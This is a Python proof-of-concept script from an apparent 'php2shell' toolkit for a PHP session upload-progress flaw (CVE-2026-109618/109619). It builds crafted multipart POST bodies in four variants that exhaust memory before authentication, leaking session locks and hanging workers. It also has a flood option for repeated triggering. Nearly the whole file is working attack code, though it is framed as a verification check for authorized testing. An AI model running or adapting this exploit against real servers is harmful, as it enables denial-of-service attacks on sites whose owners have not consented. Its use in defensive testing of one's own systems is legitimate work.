#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
"""php2shell state-corruption check -- CVE-2026-109618 / CVE-2026-109619.

This is the *verification* half of the toolkit. It proves a target actually
reaches the vulnerable condition (an out-of-memory bailout inside the
session.upload_progress handler) and reports the observable consequence. It does
**not** execute a command on the target -- there is no code-execution payload
here.

What it does
------------
Reproduces the inputs from PHP's own regression test
(tests/basic/oom_rfc1867_upload_progress.phpt): a multipart POST whose parts are
shaped to exhaust ``memory_limit`` from *inside* the upload-progress handler,
before the request script is compiled.

On the vulnerable build the handler aborts via ``longjmp`` (``zend_bailout``) and
skips its session unlock, so the session file is left **locked**. A second request
reusing that session id then blocks on the leaked lock, while a fresh id is served.
The fixed build handles the OOM cleanly and releases the session.

  --check-leak : three-phase check (trigger, reuse same id, fresh id)
  (default)    : send one trigger and classify the response

WARNING: this deliberately exhausts memory and can leave workers stuck (a
self-inflicted denial of service until PHP is restarted). Run it only against a
system you own or are authorized to test, ideally a staging copy.

Usage:
  ./poc_state_corruption.py http://host/index.php --check-leak --variant parts
  ./poc_state_corruption.py http://host/index.php --variant parts --flood 3
"""
from __future__ import annotations

import argparse
import random
import socket
import ssl
import sys
import time
from urllib.parse import urlsplit

BOUND = "---------------------------12345"
SID = "abcdef0123456789abcdef0123456789"


def part(headers: str, body: bytes) -> bytes:
    return b"--" + BOUND.encode() + b"\r\n" + headers.encode() + b"\r\n\r\n" + body + b"\r\n"


def preamble(sid: bytes = SID.encode()) -> bytes:
    return (
        part('Content-Disposition: form-data; name="PHPSESSID"', sid)
        + part('Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', b"k")
    )


def build_body(variant: str, sid: bytes = SID.encode()) -> bytes:
    out = bytearray(preamble(sid))
    if variant == "parts":
        # Many small file parts: files[] grows per part, whole session re-encoded each tick.
        for i in range(4000):
            out += part(
                f'Content-Disposition: form-data; name="u{i}"; filename="f{i}.txt"\r\nContent-Type: text/plain',
                b"xxxxxxxx",
            )
    elif variant == "longparts":
        # Fewer parts, each enlarging the encoded session a lot.
        for i in range(1000):
            name = ("u%d" % i).ljust(1024, "A")
            out += part(
                f'Content-Disposition: form-data; name="{name}"; filename="{name}.txt"\r\nContent-Type: text/plain',
                b"xxxxxxxx",
            )
    elif variant == "hugename":
        # One part whose field name AND file name are huge.
        out += b"--" + BOUND.encode() + b"\r\n" + b'Content-Disposition: form-data; name="'
        out += b"A" * (1024 * 1024)
        out += b'"; filename="'
        out += b"B" * (1024 * 1024)
        out += b'"\r\nContent-Type: text/plain\r\n\r\nxxxx\r\n'
    elif variant == "bigprogress":
        # Huge PHP_SESSION_UPLOAD_PROGRESS value: copied into the progress key
        # on MULTIPART_EVENT_FORMDATA, so the limit is reached inside the handler.
        out = bytearray(part('Content-Disposition: form-data; name="PHPSESSID"', sid))
        out += b"--" + BOUND.encode() + b"\r\n"
        out += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        out += b"A" * (1024 * 1024)
        out += b"\r\n"
        out += part('Content-Disposition: form-data; name="u"; filename="f.txt"\r\nContent-Type: text/plain', b"x")
    else:
        raise SystemExit(f"unknown variant {variant}")
    out += b"--" + BOUND.encode() + b"--\r\n"
    return bytes(out)


def _dechunk(body: bytes) -> bytes:
    out = bytearray()
    i, n = 0, len(body)
    while i < n:
        j = body.find(b"\r\n", i)
        if j < 0:
            break
        try:
            size = int(body[i:j].split(b";", 1)[0].strip(), 16)
        except ValueError:
            return body
        i = j + 2
        if size == 0:
            break
        out += body[i : i + size]
        i += size + 2
    return bytes(out)


def send_raw(url: str, body: bytes, timeout: float = 30.0) -> dict:
    u = urlsplit(url)
    scheme = (u.scheme or "http").lower()
    host = u.hostname
    port = u.port or (443 if scheme == "https" else 80)
    path = (u.path or "/") + (("?" + u.query) if u.query else "")
    head = (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"User-Agent: php2shell-statecheck\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode()
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if scheme == "https":
            s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
        s.sendall(head + body)
        s.settimeout(timeout)
        chunks = []
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            chunks.append(d)
        s.close()
    except (ConnectionResetError, BrokenPipeError, OSError) as exc:
        return {"outcome": "reset", "detail": type(exc).__name__, "ms": int((time.time() - t0) * 1000), "body": b""}
    raw = b"".join(chunks)
    dt = int((time.time() - t0) * 1000)
    if not raw:
        return {"outcome": "reset", "detail": "empty", "ms": dt, "body": b""}
    head_b, _, body_b = raw.partition(b"\r\n\r\n")
    if b"chunked" in head_b.lower():
        body_b = _dechunk(body_b)
    status = head_b.split(b"\r\n", 1)[0].decode("latin1", "replace")
    return {"outcome": "ok", "detail": status, "ms": dt, "body": body_b}


def classify(res: dict) -> str:
    b = res.get("body", b"")
    if res["outcome"] != "ok":
        return "NO-RESPONSE/CRASH"
    if b"Allowed memory size" in b:
        return "clean-OOM-fatal"
    if " 200 " in res["detail"]:
        return "no-OOM-reached"
    return "unexpected"


def check_leak(url: str, variant: str, timeout: float) -> int:
    """Three-phase state-corruption check (no command execution)."""
    sid_a = b"LOCKLEAK" + "".join(random.choice("0123456789abcdef") for _ in range(18)).encode()
    sid_b = b"FRESHID" + "".join(random.choice("0123456789abcdef") for _ in range(18)).encode()
    print(f"session id under test: {sid_a.decode()}")

    print("phase 1: trigger OOM in the upload-progress handler (pre-auth)")
    r1 = send_raw(url, build_body(variant, sid_a), timeout)
    k1 = classify(r1)
    print(f"  -> {k1} ({r1['ms']}ms)")
    if k1 == "no-OOM-reached":
        print("\nRESULT: inconclusive -- the OOM window was not reached (memory_limit too")
        print("        high for this input, or the feature is disabled). Use a lower")
        print("        memory_limit or a larger variant to force the condition.")
        return 2

    print("phase 2: reuse the SAME session id (does a leaked lock block it?)")
    r2 = send_raw(url, build_body(variant, sid_a), timeout)
    hung = r2["outcome"] != "ok"
    print(f"  -> {classify(r2)} ({r2['ms']}ms){'  <== HUNG' if hung else ''}")

    print("phase 3: a fresh session id (control)")
    r3 = send_raw(url, build_body(variant, sid_b), timeout)
    print(f"  -> {classify(r3)} ({r3['ms']}ms)")

    if hung and r3["outcome"] == "ok":
        print("\nRESULT: vulnerable -- after the OOM the session lock is leaked;")
        print("        same-id requests hang forever, fresh-id requests still work.")
        return 1
    print("\nRESULT: no lock leak observed (fixed/handled behavior).")
    return 0


def main() -> int:
    p = argparse.ArgumentParser(description="php2shell state-corruption check (no command execution)")
    p.add_argument("url")
    p.add_argument("--variant", default="parts", choices=["parts", "longparts", "hugename", "bigprogress"])
    p.add_argument("--flood", type=int, default=1, help="send the trigger this many times")
    p.add_argument("--delay", type=float, default=0.0)
    p.add_argument("--timeout", type=float, default=30.0)
    p.add_argument("--check-leak", action="store_true",
                   help="three-phase check: trigger, reuse same id, fresh id")
    a = p.parse_args()

    if a.check_leak:
        return check_leak(a.url, a.variant, a.timeout)

    body = build_body(a.variant)
    print(f"variant={a.variant} body={len(body)} bytes  target={a.url}")
    counts: dict[str, int] = {}
    for i in range(a.flood):
        res = send_raw(a.url, body, a.timeout)
        kind = classify(res)
        counts[kind] = counts.get(kind, 0) + 1
        snippet = res["body"][:120].decode("latin1", "replace").strip()
        print(f"  [{i+1:>3}] {res['outcome']:<7} {res['detail']:<24} {kind:<18} {res['ms']}ms  {snippet!r}")
        if a.delay:
            time.sleep(a.delay)
    print("summary:", counts)
    if counts.get("no-OOM-reached") == a.flood:
        return 2  # inconclusive: limits not reached
    bad = sum(v for k, v in counts.items() if k not in ("clean-OOM-fatal", "no-OOM-reached"))
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
